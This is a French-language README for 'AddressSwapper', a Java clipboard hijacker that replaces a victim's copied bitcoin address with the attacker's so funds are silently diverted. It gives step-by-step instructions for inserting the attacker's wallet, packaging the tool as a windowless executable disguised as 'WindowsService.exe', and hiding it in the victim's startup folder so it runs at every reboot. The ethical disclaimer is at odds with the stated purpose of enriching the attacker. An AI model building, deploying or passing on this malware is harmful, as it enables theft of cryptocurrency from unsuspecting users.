# AddressSwapper

AddressSwapper est un programme java qui permet de manipuler le presse-papier en remplaçant l'adresse bitcoin de la victime copiée par celle de l'attaquant. Dès lors, sans que la victime s'en aperçoive, ce programme fait en sorte que les bitcoins soient envoyés à la mauvaise adresse ;3

DISCLAIMER : Cet outil doit être utilisé dans un cadre éthique, et NE doit PAS être utilisé à des fins malveillantes. Si vous vous faites avoir, vous en êtes le responsable.

## Comment convertir le fichier jar en exécutable (.exe) ?

Avant de faire quoi que ce soit, dans le fichier java, remplacer la variable TEXT_REPLACEMENT par une de vos adresses wallet bitcoin.

Il vous faut d'abord une application pour effectuer cette opération. Pour cela, je vous recommande de télécharger la dernière version de Launch4j. Après l'avoir installé, lancer l'application et normalement, vous vous retrouverez dans la section 'basic'. Dans cette section :

 - Dans 'Output File', mettre : C:\Users\votre_nom_utilisateur\Desktop\WindowsService.exe 
 - Dans 'Jar', mettre : le chemin vers WindowsService.jar, moi dans mon cas j'ai mis C:\Users\zumal\AddressSwapper\WindowsService.jar
 - Dans 'Change dir', mettre : &EXE&

 Ensuite, dans la section 'Classpath':

 - Cocher 'Custom classpath'
 - Dans 'Main class', mettre : windows.service.WindowsService

 En outre, dans la section 'Header':
 - Cocher 'GUI'

 Aussi, dans la section 'JRE' :
 - Dans 'JRE paths', mettre : %JAVA_HOME% 
 - Dans 'Min JRE version', mettre : 17

 Enfin, il ne reste plus qu'à sauvegarder cette configuration en cliquant sur 'save configuration' (troisième icône tout en haut à gauche) : il faut sauvegarder ce fichier en xml, mettez le où vous voulez dans votre ordinateur (dans votre bureau par exemple). Ceci étant fait, il faut cliquer sur l'engrenage pour 'build' l'exécutable (toujours en haut à gauche) et appuyer sur le bouton 'play'. C'est bon, vous avez votre fichier .exe dans votre bureau.

 ## Que faire avec ce fichier .exe ? (À NE REPRODUIRE QUE SUR DES PC CONSENTANTS)

 Il suffit d'exécuter ce fichier dans un pc victime ou de le lui faire installer ce fichier pour recevoir les bitcoins dans votre wallet digital. Néanmoins, il y a un problème : si la victime éteint son pc, le processus est tué et vous ne recevrez plus les bitcoins. Une technique serait de vous rendre dans l'ordi consentant, de faire Windows+R, de taper 'shell:startup' et de glisser le fichier .exe à l'intérieur. Comme ça, à chaque redémarrage, le fichier .exe s'exécutera automatiquement, et vous continuerez à vous enrichir les poches.

